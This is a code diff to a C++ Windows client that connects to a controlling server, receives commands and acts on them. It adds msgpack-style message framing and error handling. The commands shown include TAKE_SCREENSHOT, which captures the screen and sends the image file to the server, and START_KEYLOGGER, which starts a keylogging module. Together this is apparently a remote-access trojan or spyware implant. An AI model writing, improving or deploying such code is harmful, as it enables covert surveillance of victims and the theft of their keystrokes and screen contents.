@@ -9,6 +9,8 @@
 #include <atomic>
 #include <csignal>
 #include <fstream>
+#include <vector>
+#include <sstream>
 
 // module headers
 #include <memory>
@@ -37,6 +39,37 @@ const int    RECV_BUF_SIZE = 1024;        // Buffer size for receiving data
 
 // Global atomic flag for graceful shutdown
 std::atomic<bool> g_running{true};
+
+// Simple msgpack-like message structure for server compatibility
+std::vector<char> create_message(const std::string& content) {
+    // Create a minimal msgpack array with one map element
+    // This is a very basic msgpack format: [{"content": "message"}]
+    
+    std::vector<char> result;
+    
+    // Array with 1 element (fixarray format: 0x91)
+    result.push_back(0x91);
+    
+    // Map with 1 key-value pair (fixmap format: 0x81)
+    result.push_back(0x81);
+    
+    // Key: "content" (fixstr with length 7: 0xa7)
+    result.push_back(0xa7);
+    result.insert(result.end(), {'c','o','n','t','e','n','t'});
+    
+    // Value: content string
+    if (content.length() < 32) {
+        // fixstr format: 0xa0 + length
+        result.push_back(0xa0 + static_cast<char>(content.length()));
+    } else {
+        // For longer strings, use str8 format
+        result.push_back(0xd9);
+        result.push_back(static_cast<char>(content.length()));
+    }
+    result.insert(result.end(), content.begin(), content.end());
+    
+    return result;
+}
 
 // Signal handler to catch termination signals (like Ctrl+C)
 void signal_handler(int signal) {
@@ -118,10 +151,10 @@ SOCKET connect_to_server(const char* ip, uint16_t port) {
     return sock; // Return connected socket
 }
 
-// Send message over socket
-bool send_message(SOCKET sock, const char* msg) {
-    size_t len = std::strlen(msg);
-    return send(sock, msg, static_cast<int>(len), 0) != SOCKET_ERROR;
+// Send message over socket using server's expected format
+bool send_message(SOCKET sock, const std::string& msg) {
+    std::vector<char> formatted_msg = create_message(msg);
+    return send(sock, formatted_msg.data(), static_cast<int>(formatted_msg.size()), 0) != SOCKET_ERROR;
 }
 
 // Receive message from socket
@@ -138,16 +171,31 @@ void handle_command(const std::string& command, SOCKET sock) {
     if (command == "TAKE_SCREENSHOT") {
         std::cout << "[Action] Taking screenshot..." << std::endl;
 
-        // Initialize GDI+
-        ULONG_PTR gdiplusToken;
-        Gdiplus::GdiplusStartupInput gdiStartupInput;
-        Gdiplus::GdiplusStartup(&gdiplusToken, &gdiStartupInput, NULL);
+        try {
+            // Initialize GDI+
+            ULONG_PTR gdiplusToken;
+            Gdiplus::GdiplusStartupInput gdiStartupInput;
+            Gdiplus::Status status = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiStartupInput, NULL);
+            
+            if (status != Gdiplus::Ok) {
+                std::cerr << "[Error] Failed to initialize GDI+. Status: " << status << std::endl;
+                return;
+            }
 
-        const char* filename = "screenshot.png"; // Save filename
-        TakeScreenshot(filename); // Capture screenshot
-        SendFile(sock, filename); // Send the screenshot file
+            const char* filename = "screenshot.png"; // Save filename
+            TakeScreenshot(filename); // Capture screenshot
+            
+            std::cout << "[Action] Screenshot taken, sending file..." << std::endl;
+            if (!SendFile(sock, filename)) {
+                std::cerr << "[Error] Failed to send screenshot file" << std::endl;
+            } else {
+                std::cout << "[Action] Screenshot sent successfully" << std::endl;
+            }
 
-        Gdiplus::GdiplusShutdown(gdiplusToken); // Shutdown GDI+
+            Gdiplus::GdiplusShutdown(gdiplusToken); // Shutdown GDI+
+        } catch (const std::exception& e) {
+            std::cerr << "[Error] Exception in screenshot handling: " << e.what() << std::endl;
+        }
     }
     else if (command == "START_KEYLOGGER") {
         std::cout << "[Action] Starting keylogger module..." << std::endl;
@@ -177,7 +225,7 @@ void handle_connection() {
     std::cout << "[Thread] Connected to server on " << SERVER_IP << ":" << SERVER_PORT << std::endl;
 
     // Send initial greeting message
-    const char* greeting = "Hello from threaded client!";
+    std::string greeting = "Hello from threaded client!";
     if (!send_message(sock, greeting)) {
         std::cerr << "Error: Send failed." << std::endl;
         goto cleanup;
@@ -186,23 +234,32 @@ void handle_connection() {
 
     // Listening for server commands
     char buffer[RECV_BUF_SIZE];
+    std::cout << "[Thread] Starting command listening loop..." << std::endl;
+    
     while (g_running) {
+        std::cout << "[Thread] Waiting for command..." << std::endl;
         int received = receive_reply(sock, buffer, RECV_BUF_SIZE);
+        
         if (received > 0) {
+            std::cout << "[Thread] Received " << received << " bytes" << std::endl;
             std::string command(buffer);
             handle_command(command, sock);
 
             // Send acknowledgment back
             std::string ack = "ACK: " + command;
-            if (!send_message(sock, ack.c_str())) {
+            if (!send_message(sock, ack)) {
                 std::cerr << "Error: Failed to send acknowledgment." << std::endl;
                 break;
             }
+            std::cout << "[Thread] Sent acknowledgment" << std::endl;
         } else if (received == 0) {
             std::cout << "[Thread] Server closed the connection." << std::endl;
             break;
         } else {
-            std::cerr << "Error: Receive failed." << std::endl;
+            std::cerr << "Error: Receive failed. Error code: " << received << std::endl;
+#ifdef _WIN32
+            std::cerr << "WSA Error: " << WSAGetLastError() << std::endl;
+#endif
             break;
         }
     }
@@ -226,7 +283,7 @@ int main() {
     // Launch thread for handling connection
     std::thread clientThread(handle_connection);
 
-    // Wait for thread to finish
+    // Wait for thread to finish (blocks until connection thread exits)
     clientThread.join();
 
     std::cout << "Client thread finished. Exiting." << std::endl;
